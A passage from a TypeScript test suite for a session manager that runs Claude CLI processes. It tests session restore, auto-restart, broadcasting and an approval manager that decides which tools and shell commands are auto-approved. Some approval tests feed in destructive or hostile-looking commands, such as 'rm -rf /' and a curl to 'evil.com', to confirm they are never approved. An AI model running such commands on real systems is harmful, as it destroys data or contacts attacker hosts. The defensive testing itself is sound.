      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      sm.addToHistory(s, {
        type: 'todo_update',
        tasks: [
          { id: '1', content: 'Task 1', status: 'in_progress' },
        ],
      } as any)
      // Add some messages after the todo_update
      sm.addToHistory(s, { type: 'output', data: 'some output' } as any)
      sm.addToHistory(s, { type: 'result' } as any)

      sm.shutdown()

      // Should still find and complete the earlier todo_update
      const lastMsg = s.outputHistory[s.outputHistory.length - 1] as any
      expect(lastMsg.type).toBe('todo_update')
      expect(lastMsg.tasks[0].status).toBe('completed')
    })
  })

  describe('restoreFromDisk() with actual data', () => {
    it('restores sessions with all fields from JSON', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [
        {
          id: 'restored-1',
          name: 'Restored Session',
          workingDir: '/tmp/restored',
          groupDir: '/tmp/group',
          created: '2025-01-01T00:00:00.000Z',
          source: 'webhook',
          claudeSessionId: 'claude-sess-abc',
          wasActive: true,
          outputHistory: [
            { type: 'user_echo', text: 'hello' },
            { type: 'output', data: 'hi there' },
          ],
        },
      ]

      mockedExistsSync.mockImplementation((p) => {
        if (String(p).includes('sessions.json')) return true
        return false
      })
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()
      const restored = sm2.get('restored-1')

      expect(restored).toBeDefined()
      expect(restored!.name).toBe('Restored Session')
      expect(restored!.workingDir).toBe('/tmp/restored')
      expect(restored!.groupDir).toBe('/tmp/group')
      expect(restored!.created).toBe('2025-01-01T00:00:00.000Z')
      expect(restored!.source).toBe('webhook')
      expect(restored!.claudeSessionId).toBe('claude-sess-abc')
      expect(restored!._wasActiveBeforeRestart).toBe(true)
      expect(restored!.outputHistory).toHaveLength(2)
      expect(restored!.claudeProcess).toBeNull()
      expect(restored!.clients.size).toBe(0)
      expect(restored!.restartCount).toBe(0)
      expect(restored!._turnCount).toBe(99) // restored sessions get 99

      // Reset mocks
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })

    it('defaults source to manual when not present', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [{
        id: 'no-source',
        name: 'No Source',
        workingDir: '/tmp',
        created: '2025-01-01T00:00:00.000Z',
        claudeSessionId: null,
        outputHistory: [],
      }]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()
      const restored = sm2.get('no-source')

      expect(restored!.source).toBe('manual')

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })

    it('handles malformed JSON gracefully', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue('not valid json{{{')

      // Should not throw
      const sm2 = new SessionManager()
      expect(sm2.list()).toHaveLength(0)

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })
  })

  describe('restoreRepoApprovalsFromDisk()', () => {
    it('restores repo approvals from JSON', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const approvalData = {
        '/tmp/repo-a': {
          tools: ['Write', 'Edit'],
          commands: ['npm test', 'git status'],
        },
        '/tmp/repo-b': {
          tools: ['Bash'],
        },
      }

      mockedExistsSync.mockImplementation((p) => {
        const path = String(p)
        if (path.includes('repo-approvals.json')) return true
        if (path.includes('sessions.json')) return false
        return false
      })
      mockedReadFileSync.mockReturnValue(JSON.stringify(approvalData))

      const sm2 = new SessionManager()

      const approvalsA = sm2.approvalManager.getApprovals('/tmp/repo-a')
      expect(approvalsA.tools).toEqual(['Edit', 'Write'])
      expect(approvalsA.commands).toEqual(['git status', 'npm test'])

      const approvalsB = sm2.approvalManager.getApprovals('/tmp/repo-b')
      expect(approvalsB.tools).toEqual(['Bash'])
      expect(approvalsB.commands).toEqual([])

      // Reset mocks
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })

    it('does nothing when file does not exist', () => {
      const mockedExistsSync = vi.mocked(existsSync)

      mockedExistsSync.mockImplementation(() => false)

      const sm2 = new SessionManager()
      expect(sm2.approvalManager.getApprovals('/any')).toEqual({ tools: [], commands: [], patterns: [] })

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
    })
  })

  describe('restoreActiveSessions()', () => {
    beforeEach(() => {
      vi.useFakeTimers()
    })

    afterEach(() => {
      vi.useRealTimers()
    })

    it('auto-restarts sessions that were active and have claudeSessionId', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [
        {
          id: 'active-1',
          name: 'Active Session',
          workingDir: '/tmp/active',
          created: '2025-01-01T00:00:00.000Z',
          claudeSessionId: 'claude-abc',
          wasActive: true,
          outputHistory: [],
        },
        {
          id: 'inactive-1',
          name: 'Inactive Session',
          workingDir: '/tmp/inactive',
          created: '2025-01-01T00:00:00.000Z',
          claudeSessionId: null,
          wasActive: false,
          outputHistory: [],
        },
      ]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()

      // Mock startClaude to prevent actual process spawning
      const startClaudeSpy = vi.spyOn(sm2, 'startClaude').mockReturnValue(true)

      sm2.restoreActiveSessions()

      // First session gets started at t=0
      vi.advanceTimersByTime(0)
      expect(startClaudeSpy).toHaveBeenCalledWith('active-1')

      // inactive-1 should never be started (no claudeSessionId)
      vi.advanceTimersByTime(5000)
      expect(startClaudeSpy).not.toHaveBeenCalledWith('inactive-1')
      expect(startClaudeSpy).toHaveBeenCalledTimes(1)

      startClaudeSpy.mockRestore()
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })

    it('skips sessions without claudeSessionId even if wasActive', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [{
        id: 'no-claude-id',
        name: 'No Claude ID',
        workingDir: '/tmp',
        created: '2025-01-01T00:00:00.000Z',
        claudeSessionId: null,
        wasActive: true,
        outputHistory: [],
      }]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()
      const startClaudeSpy = vi.spyOn(sm2, 'startClaude').mockReturnValue(true)

      sm2.restoreActiveSessions()

      vi.advanceTimersByTime(5000)
      expect(startClaudeSpy).not.toHaveBeenCalled()

      startClaudeSpy.mockRestore()
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })

    it('does nothing when no sessions to restore', () => {
      // sm has no sessions with _wasActiveBeforeRestart
      sm.create('test', '/tmp')

      // Should not throw
      sm.restoreActiveSessions()
    })

    it('broadcasts system_message for restored sessions', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [{
        id: 'restore-msg',
        name: 'Restore Msg',
        workingDir: '/tmp',
        created: '2025-01-01T00:00:00.000Z',
        claudeSessionId: 'claude-xyz',
        wasActive: true,
        outputHistory: [],
      }]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()
      vi.spyOn(sm2, 'startClaude').mockReturnValue(true)

      // Join a client to see broadcasts
      const ws = fakeWs()
      sm2.join('restore-msg', ws)

      sm2.restoreActiveSessions()

      vi.advanceTimersByTime(0)

      expect(ws.send).toHaveBeenCalled()
      const messages = ws.send.mock.calls.map((c: any) => JSON.parse(c[0]))
      const restoreMsg = messages.find((m: any) => m.type === 'system_message' && m.subtype === 'restart')
      expect(restoreMsg).toBeDefined()
      expect(restoreMsg.text).toContain('auto-restored')

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })

    it('clears _wasActiveBeforeRestart flag after restore', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [{
        id: 'clear-flag',
        name: 'Clear Flag',
        workingDir: '/tmp',
        created: '2025-01-01T00:00:00.000Z',
        claudeSessionId: 'claude-123',
        wasActive: true,
        outputHistory: [],
      }]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()
      vi.spyOn(sm2, 'startClaude').mockReturnValue(true)

      sm2.restoreActiveSessions()
      vi.advanceTimersByTime(0)

      const session = sm2.get('clear-flag')
      expect(session!._wasActiveBeforeRestart).toBe(false)

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })

    it('staggers multiple session restarts by 1 second each', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [
        { id: 'stagger-1', name: 'S1', workingDir: '/tmp', created: '2025-01-01T00:00:00.000Z', claudeSessionId: 'c1', wasActive: true, outputHistory: [] },
        { id: 'stagger-2', name: 'S2', workingDir: '/tmp', created: '2025-01-01T00:00:00.000Z', claudeSessionId: 'c2', wasActive: true, outputHistory: [] },
        { id: 'stagger-3', name: 'S3', workingDir: '/tmp', created: '2025-01-01T00:00:00.000Z', claudeSessionId: 'c3', wasActive: true, outputHistory: [] },
      ]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()
      const startClaudeSpy = vi.spyOn(sm2, 'startClaude').mockReturnValue(true)

      sm2.restoreActiveSessions()

      // At t=0, first session starts
      vi.advanceTimersByTime(0)
      expect(startClaudeSpy).toHaveBeenCalledTimes(1)
      expect(startClaudeSpy).toHaveBeenCalledWith('stagger-1')

      // At t=1000, second session starts
      vi.advanceTimersByTime(1000)
      expect(startClaudeSpy).toHaveBeenCalledTimes(2)
      expect(startClaudeSpy).toHaveBeenCalledWith('stagger-2')

      // At t=2000, third session starts
      vi.advanceTimersByTime(1000)
      expect(startClaudeSpy).toHaveBeenCalledTimes(3)
      expect(startClaudeSpy).toHaveBeenCalledWith('stagger-3')

      startClaudeSpy.mockRestore()
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })
  })

  describe('onSessionExit()', () => {
    it('registers exit listener', () => {
      const listener = vi.fn()
      sm.onSessionExit(listener)

      // The listener should be stored (we can verify by accessing private _exitListeners)
      expect((sm as any)._exitListeners).toContain(listener)
    })

    it('accumulates multiple listeners', () => {
      const listener1 = vi.fn()
      const listener2 = vi.fn()
      sm.onSessionExit(listener1)
      sm.onSessionExit(listener2)

      expect((sm as any)._exitListeners).toHaveLength(2)
    })
  })

  describe('broadcast() back-pressure', () => {
    it('drops message when client buffer exceeds 1MB', () => {
      const s = sm.create('bp-test', '/tmp')
      const overloaded = fakeWs()
      overloaded.bufferedAmount = 2_000_000
      const normal = fakeWs()
      sm.join(s.id, overloaded)
      sm.join(s.id, normal)
      sm.broadcast(sm.get(s.id)!, { type: 'result' } as any)
      expect(overloaded.send).not.toHaveBeenCalled()
      expect(normal.send).toHaveBeenCalled()
    })

    it('skips clients that are not OPEN', () => {
      const s = sm.create('closed-test', '/tmp')
      const closed = fakeWs(false)
      sm.join(s.id, closed)
      sm.broadcast(sm.get(s.id)!, { type: 'result' } as any)
      expect(closed.send).not.toHaveBeenCalled()
    })
  })

  describe('restoreRepoApprovalsFromDisk() error handling', () => {
    it('handles corrupted JSON gracefully', () => {
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)
      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

      mockedExistsSync.mockImplementation((p) => String(p).includes('repo-approvals.json') ? true : false)
      mockedReadFileSync.mockImplementation((p) => {
        if (String(p).includes('repo-approvals.json')) return '{invalid json'
        return '[]'
      })

      // Should not throw - constructor parses the corrupted JSON
      expect(() => new SessionManager()).not.toThrow()
      expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('Failed to restore repo approvals'), expect.any(Error))

      consoleSpy.mockRestore()
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })
  })

  describe('restoreActiveSessions() continuation message', () => {
    it('skips continuation message when claudeSessionId exists (--resume handles context)', () => {
      vi.useFakeTimers()
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [{
        id: 'continue-test',
        name: 'Continue Test',
        workingDir: '/tmp',
        created: '2025-01-01T00:00:00.000Z',
        claudeSessionId: 'claude-continue',
        wasActive: true,
        outputHistory: [],
      }]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()

      const fakeCp = {
        ...fakeClaudeProcess(),
        once: vi.fn(),
      }

      vi.spyOn(sm2, 'startClaude').mockImplementation((id) => {
        const session = sm2.get(id)
        if (session) (session as any).claudeProcess = fakeCp
        return true
      })

      sm2.restoreActiveSessions()
      vi.advanceTimersByTime(0)

      // When claudeSessionId exists, --resume picks up full context from the
      // JSONL automatically — no system_init listener or continuation message needed.
      expect(fakeCp.once).not.toHaveBeenCalledWith('system_init', expect.any(Function))

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
      vi.useRealTimers()
    })

    it('skips sessions without claudeSessionId during restore', () => {
      vi.useFakeTimers()
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [{
        id: 'no-claude-id-test',
        name: 'No Claude ID',
        workingDir: '/tmp',
        created: '2025-01-01T00:00:00.000Z',
        claudeSessionId: null,
        wasActive: true,
        outputHistory: [],
      }]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()
      const startSpy = vi.spyOn(sm2, 'startClaude')

      sm2.restoreActiveSessions()
      vi.advanceTimersByTime(0)

      // Sessions without claudeSessionId are not restored (nothing to --resume)
      expect(startSpy).not.toHaveBeenCalled()

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
      vi.useRealTimers()
    })

    it('skips already-running sessions during restore', () => {
      vi.useFakeTimers()
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      const sessionData = [{
        id: 'already-running',
        name: 'Already Running',
        workingDir: '/tmp',
        created: '2025-01-01T00:00:00.000Z',
        claudeSessionId: 'claude-running',
        wasActive: true,
        outputHistory: [],
      }]

      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(JSON.stringify(sessionData))

      const sm2 = new SessionManager()

      // Pre-assign a running ClaudeProcess
      const session = sm2.get('already-running')!
      ;(session as any).claudeProcess = fakeClaudeProcess(true)

      const startClaudeSpy = vi.spyOn(sm2, 'startClaude').mockReturnValue(true)

      sm2.restoreActiveSessions()
      vi.advanceTimersByTime(0)

      // Should not start Claude since it's already alive
      expect(startClaudeSpy).not.toHaveBeenCalled()

      startClaudeSpy.mockRestore()
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
      vi.useRealTimers()
    })
  })

  describe('handleClaudeExit behavior', () => {
    it('stops auto-restart when _stoppedByUser is set', () => {
      vi.useFakeTimers()
      const s = sm.create('stopped-user', '/tmp')
      const session = sm.get(s.id)!

      // Simulate that Claude was running and user stopped it
      ;(session as any)._stoppedByUser = true
      ;(session as any).claudeProcess = fakeClaudeProcess()

      const ws = fakeWs()
      sm.join(s.id, ws)

      // Trigger exit via the private method by calling it directly
      // Signature: handleClaudeExit(session, sessionId, code, signal, sessionConflict, producedOutput)
      ;(sm as any).handleClaudeExit(session, s.id, 1, null, false, true)

      // Should broadcast exit, not restart
      const messages = ws.send.mock.calls.map((c: any) => JSON.parse(c[0]))
      const exitMsg = messages.find((m: any) => m.type === 'system_message' && m.subtype === 'exit')
      expect(exitMsg).toBeDefined()
      expect(exitMsg.text).toContain('code=1')

      // Should NOT broadcast restart message
      const restartMsg = messages.find((m: any) => m.subtype === 'restart')
      expect(restartMsg).toBeUndefined()
      vi.useRealTimers()
    })

    it('preserves claudeSessionId on restart so --resume can continue the session', () => {
      vi.useFakeTimers()
      const s = sm.create('stale-id', '/tmp')
      const session = sm.get(s.id)!
      ;(session as any).claudeSessionId = 'stale-session'
      ;(session as any).restartCount = 0
      ;(session as any).lastRestartAt = null

      // producedOutput=true so claudeSessionId is preserved for --resume
      ;(sm as any).handleClaudeExit(session, s.id, 1, null, false, true)

      expect(session.claudeSessionId).toBe('stale-session')
      vi.useRealTimers()
    })

    it('resets restart count after cooldown period', () => {
      vi.useFakeTimers()
      const s = sm.create('cooldown-test', '/tmp')
      const session = sm.get(s.id)!
      ;(session as any).restartCount = 2
      ;(session as any).lastRestartAt = Date.now() - 600_000 // 10 minutes ago (> 5 min cooldown)

      ;(sm as any).handleClaudeExit(session, s.id, 0, null, false, true)

      // restartCount should have been reset to 0 before incrementing to 1
      expect((session as any).restartCount).toBe(1)
      vi.useRealTimers()
    })

    it('broadcasts error when all restart attempts exhausted', () => {
      vi.useFakeTimers()
      const s = sm.create('exhausted-test', '/tmp')
      const session = sm.get(s.id)!
      ;(session as any).restartCount = 5 // MAX_RESTARTS is 5
      ;(session as any).lastRestartAt = Date.now()

      const ws = fakeWs()
      sm.join(s.id, ws)

      ;(sm as any).handleClaudeExit(session, s.id, 1, null, false, true)

      const messages = ws.send.mock.calls.map((c: any) => JSON.parse(c[0]))
      const errorMsg = messages.find((m: any) => m.subtype === 'error')
      expect(errorMsg).toBeDefined()
      expect(errorMsg.text).toContain('Auto-restart disabled')
      vi.useRealTimers()
    })

    it('notifies exit listeners with willRestart=true on auto-restart', () => {
      vi.useFakeTimers()
      const listener = vi.fn()
      sm.onSessionExit(listener)

      const s = sm.create('listener-test', '/tmp')
      const session = sm.get(s.id)!
      ;(session as any).restartCount = 0

      ;(sm as any).handleClaudeExit(session, s.id, 1, 'SIGTERM', false, true)

      expect(listener).toHaveBeenCalledWith(s.id, 1, 'SIGTERM', true)
      vi.useRealTimers()
    })

    it('notifies exit listeners with willRestart=false when stopped by user', () => {
      const listener = vi.fn()
      sm.onSessionExit(listener)

      const s = sm.create('listener-stopped', '/tmp')
      const session = sm.get(s.id)!
      ;(session as any)._stoppedByUser = true

      ;(sm as any).handleClaudeExit(session, s.id, 0, null, false, true)

      expect(listener).toHaveBeenCalledWith(s.id, 0, null, false)
    })
  })

  describe('checkAutoApproval()', () => {
    it('approves a tool that was explicitly saved', () => {
      sm.create('auto-approve-test', '/tmp/repo-a')
      // Directly add a tool approval via the private method
      ;sm.approvalManager.addRepoApproval('/tmp/repo-a', { tool: 'Read' })

      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-a', 'Read', {})).toBe(true)
    })

    it('does not approve an unknown tool', () => {
      sm.create('auto-approve-test', '/tmp/repo-b')
      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-b', 'Write', {})).toBe(false)
    })

    it('approves an exact Bash command match', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/repo-c', { command: 'npm test' })

      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-c', 'Bash', { command: 'npm test' })).toBe(true)
      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-c', 'Bash', { command: 'npm run build' })).toBe(false)
    })

    it('approves safe prefix commands when any same-prefix command was approved', () => {
      // Approve "git diff HEAD" — should also approve "git diff --staged"
      ;sm.approvalManager.addRepoApproval('/tmp/repo-d', { command: 'git diff HEAD' })

      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-d', 'Bash', { command: 'git diff --staged' })).toBe(true)
      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-d', 'Bash', { command: 'git log --oneline' })).toBe(false)
    })

    it('does not use prefix matching for dangerous commands', () => {
      // Approve "rm /tmp/x" — should NOT approve "rm -rf /"
      ;sm.approvalManager.addRepoApproval('/tmp/repo-e', { command: 'rm /tmp/x' })

      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-e', 'Bash', { command: 'rm /tmp/x' })).toBe(true)
      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-e', 'Bash', { command: 'rm -rf /' })).toBe(false)
    })

    it('approves commands matching a stored pattern', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/repo-f', { pattern: 'cat *' })

      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-f', 'Bash', { command: 'cat package.json' })).toBe(true)
      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-f', 'Bash', { command: 'cat' })).toBe(true)
      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-f', 'Bash', { command: 'rm file.txt' })).toBe(false)
    })

    it('handles empty command gracefully', () => {
      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-g', 'Bash', { command: '' })).toBe(false)
      expect(sm.approvalManager.checkAutoApproval('/tmp/repo-g', 'Bash', {})).toBe(false)
    })

    it('auto-approves a tool approved in 2+ other repos (cross-repo inference)', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-1', { tool: 'Write' })
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-2', { tool: 'Write' })

      // Write was never approved for xrepo-3, but 2 other repos have it
      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-3', 'Write', {})).toBe(true)
    })

    it('does not cross-repo approve a tool approved in only 1 other repo', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-solo', { tool: 'NotebookEdit' })

      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-other', 'NotebookEdit', {})).toBe(false)
    })

    it('auto-approves a Bash command approved in 2+ other repos', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-a', { command: 'npm test' })
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-b', { command: 'npm test' })

      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-c', 'Bash', { command: 'npm test' })).toBe(true)
    })

    it('cross-repo inference works with prefix matching for safe commands', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-p1', { command: 'git diff HEAD' })
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-p2', { command: 'git diff --staged' })

      // Different git diff variant, but prefix matches in 2 repos
      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-p3', 'Bash', { command: 'git diff main' })).toBe(true)
    })

    it('cross-repo inference works with pattern matching', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-pat1', { pattern: 'cat *' })
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-pat2', { pattern: 'cat *' })

      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-pat3', 'Bash', { command: 'cat README.md' })).toBe(true)
    })

    it('cross-repo inference does not apply for dangerous commands', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-d1', { command: 'rm /tmp/x' })
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-d2', { command: 'rm /tmp/x' })

      // Exact match works cross-repo
      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-d3', 'Bash', { command: 'rm /tmp/x' })).toBe(true)
      // But different rm command does NOT — dangerous prefix not expanded
      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-d3', 'Bash', { command: 'rm -rf /' })).toBe(false)
    })

    it('does not count the same repo in cross-repo threshold', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/xrepo-self', { tool: 'Agent' })
      // Only 1 repo has it — should not self-count as 2
      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-self', 'Agent', {})).toBe(true) // direct match
      expect(sm.approvalManager.checkAutoApproval('/tmp/xrepo-new', 'Agent', {})).toBe(false) // only 1 other repo
    })
  })

  describe('derivePattern()', () => {
    it('returns a pattern for a single-token safe command', () => {
      expect(sm.approvalManager.derivePattern('Bash', { command: 'cat /etc/hosts' })).toBe('cat *')
      expect(sm.approvalManager.derivePattern('Bash', { command: 'ls -la /tmp' })).toBe('ls *')
      expect(sm.approvalManager.derivePattern('Bash', { command: 'grep -r foo' })).toBe('grep *')
    })

    it('returns a pattern for a two-token safe command', () => {
      expect(sm.approvalManager.derivePattern('Bash', { command: 'git diff HEAD' })).toBe('git diff *')
      expect(sm.approvalManager.derivePattern('Bash', { command: 'npm run build' })).toBe('npm run *')
      expect(sm.approvalManager.derivePattern('Bash', { command: 'cargo test --release' })).toBe('cargo test *')
    })

    it('returns null for non-Bash tools', () => {
      expect(sm.approvalManager.derivePattern('Read', { file: '/tmp/x' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Write', {})).toBeNull()
    })

    it('returns null for dangerous commands', () => {
      expect(sm.approvalManager.derivePattern('Bash', { command: 'rm -rf /' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'sudo apt install' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'curl https://evil.com' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'docker run --rm ubuntu' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'git push origin main' })).toBeNull()
    })

    it('returns null for code executors (arbitrary code risk)', () => {
      expect(sm.approvalManager.derivePattern('Bash', { command: 'node script.js' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'npx create-react-app my-app' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'python script.py' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'python3 -c "import os"' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'deno run server.ts' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'bun script.ts' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', { command: 'pm2 start app.js' })).toBeNull()
    })

    it('still returns patterns for safe two-token subcommands of restricted CLIs', () => {
      expect(sm.approvalManager.derivePattern('Bash', { command: 'bun run dev' })).toBe('bun run *')
      expect(sm.approvalManager.derivePattern('Bash', { command: 'bun test --watch' })).toBe('bun test *')
      expect(sm.approvalManager.derivePattern('Bash', { command: 'pip install requests' })).toBe('pip install *')
    })

    it('returns null for empty command', () => {
      expect(sm.approvalManager.derivePattern('Bash', { command: '' })).toBeNull()
      expect(sm.approvalManager.derivePattern('Bash', {})).toBeNull()
    })
  })

  describe('setModel()', () => {
    it('returns false for unknown sessionId', () => {
      expect(sm.setModel('no-such-id', 'gpt-4')).toBe(false)
    })

    it('returns true and sets model on existing session', () => {
      const s = sm.create('test', '/tmp')
      const result = sm.setModel(s.id, 'opus')
      expect(result).toBe(true)
      expect(s.model).toBe('opus')
    })

    it('sets model to undefined when empty string passed', () => {
      const s = sm.create('test', '/tmp')
      s.model = 'opus'
      sm.setModel(s.id, '')
      expect(s.model).toBeUndefined()
    })

    it('restarts Claude when process is alive', () => {
      vi.useFakeTimers()
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      const stopSpy = vi.spyOn(sm, 'stopClaude')
      const startSpy = vi.spyOn(sm, 'startClaude').mockReturnValue(true)

      sm.setModel(s.id, 'sonnet')

      expect(stopSpy).toHaveBeenCalledWith(s.id)

      // startClaude should NOT have been called yet
      expect(startSpy).not.toHaveBeenCalled()

      // Advance past the 500ms delay
      vi.advanceTimersByTime(500)
      expect(startSpy).toHaveBeenCalledWith(s.id)

      stopSpy.mockRestore()
      startSpy.mockRestore()
      vi.useRealTimers()
    })

    it('does NOT restart when process is not alive', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(false)
      s.claudeProcess = cp

      const stopSpy = vi.spyOn(sm, 'stopClaude')

      sm.setModel(s.id, 'sonnet')

      expect(stopSpy).not.toHaveBeenCalled()
      stopSpy.mockRestore()
    })
  })

  describe('handleClaudeResult API retry', () => {
    it('broadcasts exhaustion message after MAX_API_RETRIES', () => {
      vi.useFakeTimers()
      const s = sm.create('retry-exhaust', '/tmp')
      const session = sm.get(s.id)!
      ;(session as any)._apiRetryCount = 3 // MAX_API_RETRIES is 3
      ;(session as any)._lastUserInput = 'test input'
      ;(session as any).claudeProcess = fakeClaudeProcess()

      const ws = fakeWs()
      sm.join(s.id, ws)

      // Simulate a retryable error result with retries exhausted
      ;(sm as any).handleClaudeResult(session, s.id, 'API error: overloaded', true)

      const messages = ws.send.mock.calls.map((c: any) => JSON.parse(c[0]))
      const errorMsg = messages.find((m: any) => m.subtype === 'error' && m.text?.includes('retries'))
      expect(errorMsg).toBeDefined()
      expect(errorMsg.text).toContain('3 retries')

      // Retry counter should be reset
